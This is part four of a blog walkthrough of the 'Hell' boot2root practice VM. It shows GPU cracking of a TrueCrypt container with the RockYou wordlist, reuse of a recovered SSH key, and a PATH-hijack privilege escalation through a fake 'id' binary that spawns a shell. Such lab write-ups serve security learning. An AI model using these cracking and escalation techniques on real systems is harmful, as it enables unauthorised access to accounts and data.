---
author: recrudesce
comments: false
date: 2014-07-20 18:46:02+00:00
layout: post
slug: hell-walkthrough-part-4
title: Hell Walkthrough - Part 4
wordpress_id: 136
categories:
- VM's
tags:
- boot2root
- g0tmi1k
- hacking
- hell
- nmap
- peleus
- vulnhub
---

[Part 1](http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/) | [Part 2](http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/) | [Part 3](http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/) | Part 4 | [Part 5](http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/)

Yup, we're still going.  Told you it'd be a long journey didn't I ?



## Tales from the Crypt, But First I'll Rock You


George has one file in his home folder - a Truecrypt container.  I guess no one has told George that TrueCrypt isn't recommended any more - he should be using something else.  *shakes fist at the NSA*
<!-- more -->

Mounting the TrueCrypt container requires us to know the container password, which we currently don't have.


``` bash

george@hell:~$ truecrypt --mount container.tc 
Enter mount directory [default]: 
Enter password for /home/george/container.tc: 
Enter keyfile [none]: 
Protect hidden volume (if any)? (y=Yes/n=No) [No]: 
No password or keyfile specified.
```


Looking around a bit more, it looks like George has also signed up for RockYou


``` bash

From: admin@rockyou.com
To: super_admin@hell.com
Subject: Account Activation
Date: 13th November 2009

Thanks for signing up for your account. I hope you enjoy our services. 
```


*ka-ching* George's password will be on the leaked RockYou wordlist.  oclHashCat can help us out here, thanks to the ability to use GPU's.  Yes, I'm using a Windows PC for this, sue me.


``` bash

G:\Downloads\oclHashcat-1.21>oclHashcat64.exe -m 6211 -a 0 "g:\downloads\container.tc" g:\Downloads\dictionaries\catted\rockyou.txt

g:\downloads\container.tc:letsyouupdateyourfunnotesandmore

Session.Name...: oclHashcat
Status.........: Cracked
Input.Mode.....: File (g:\Downloads\dictionaries\catted\rockyou.txt)
Hash.Target....: File (g:\downloads\container.tc)
Hash.Type......: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
Time.Started...: Sat Jul 12 23:06:15 2014 (17 secs)
Speed.GPU.#1...:    29889 H/s
Recovered......: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.......: 496641/14343296 (3.46%)
Skipped........: 0/496641 (0.00%)
Rejected.......: 1/496641 (0.00%)
HWMon.GPU.#1...: 97% Util, 56c Temp, 32% Fan

Started: Sat Jul 12 23:06:15 2014
Stopped: Sat Jul 12 23:06:37 2014
```


That didn't take too long now did it ?  But we have the TrueCrypt container password, which makes mounting it a tiny bit easier now.


``` bash

george@hell:~$ truecrypt --mount container.tc 
Enter mount directory [default]: ./tc
Enter password for /home/george/container.tc: letsyouupdateyourfunnotesandmore
Enter keyfile [none]: 
Protect hidden volume (if any)? (y=Yes/n=No) [No]: 

george@hell:~$ cd tc
george@hell:~/tc$ ls -l
total 2
-rwx------ 1 george george 1679 Jul  5 20:01 id_rsa
george@hell:~/tc$ 
```


Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.


``` bash

george@hell:~/tc$ ssh bazza@127.0.0.1 -i ./id_rsa 
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul 13 21:18:28 2014 from 192.168.0.102
$ whoami
bazza
```


Oh... I was expecting a bit more of a fight, but I guess Bazza trusts George, even though he uses defunct software that allows privilege escalation (look it up).  Fool. 



## Bazza's Blockade



Once again we're presented with 2 binaries, with SUID attributes set.  This time, however, we can read the files, which means we can decompile them.  Time to take a look

[c]int __cdecl main()
{
  int result; // eax@6
  _BYTE v1[3]; // [sp+19h] [bp-417h]@3
  FILE *v2; // [sp+424h] [bp-Ch]@1
  const char *v3; // [sp+428h] [bp-8h]@1
  const char *v4; // [sp+42Ch] [bp-4h]@1

  v4 = "900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2\n";
  v3 = "1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id\n";
  printf("Checking integrity of part2...");
  v2 = popen("sha256sum /home/bazza/part2", "r");
  if ( !v2 )
    puts("Failed to run command");
  fgets(v1, 1034, v2);
  if ( strcmp(v1, v4) )
  {
    puts("Uh oh.... Corrupted or in wrong directory (/home/bazza/)\n");
    result = 0;
  }
  else
  {
    puts(" Done!!\n");
    printf("Checking integrity of calling target...");
    v2 = popen("sha256sum /usr/bin/id", "r");
    if ( !v2 )
      puts("Failed to run command");
    fgets(v1, 1034, v2);
    if ( strcmp(v1, v3) )
    {
      puts("Target corrupt\n");
      result = 0;
    }
    else
    {
      puts(" Done!!\n\nBinary and target confirmed.");
      system("/home/bazza/part2");
      pclose(v2);
      result = 0;
    }
  }
  return result;
}
```


OK, so part1 runs part2 (this time with an absolute path), so time for a quick peek into part2

[c]int __cdecl main()
{
  __gid_t v0; // eax@2
  int result; // eax@2

  if ( getegid() == 1003 )
  {
    puts("\nCan't touch this *nah na na na na naaaaaaaa nah*");
    system("id");
    result = 0;
  }
  else
  {
    v0 = getegid();
    printf("\n\nError! %d ID detected ... you're not allowed to run this, please use part 1!\n", v0);
    result = 0;
  }
  return result;
}
```


So, part2 will run only if the effective group identifier is 1003.  part1 has a SUID attribute set as group developers, which means you have to run part1 before part2.  If you run part2 first, this happens


``` bash

Error! 1004 ID detected ... you're not allowed to run this, please use part 1!
```


Running part1 changes our effective group identifier, and part2 changes our effective user identifier, but doesn't seem to drop us to a shell as that user (oj)


``` bash

$ ./part1
Checking integrity of part2... Done!!

Checking integrity of calling target... Done!!

Binary and target confirmed.

Can't touch this *nah na na na na naaaaaaaa nah*
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
$ whoami
bazza
```


A further look into the source code for part2 shows that it is not using an absolute path for the system("id") function, therefore we can trick this application into running a bogus id binary in the same way we did with the bogus chmod binary.  The source code is pretty much the same, apart from the fact I'm using uid 1005 rather than 1000.

[c]#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
 setuid( 1005 );
 system("/usr/bin/id");
 system( "/bin/sh -i" );
}
```


This is compiled, placed in /tmp and made executable.  The path environment variable is modified as per last time and we're good to go.


``` bash

$ ./part1
Checking integrity of part2... Done!!

Checking integrity of calling target... Done!!

Binary and target confirmed.

Can't touch this *nah na na na na naaaaaaaa nah*
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
$ whoami
oj

```


Success !

Nearly there, only this hoop to jump through and we're done.  I figured this'd be a 5 parter, now I know it is going to be.
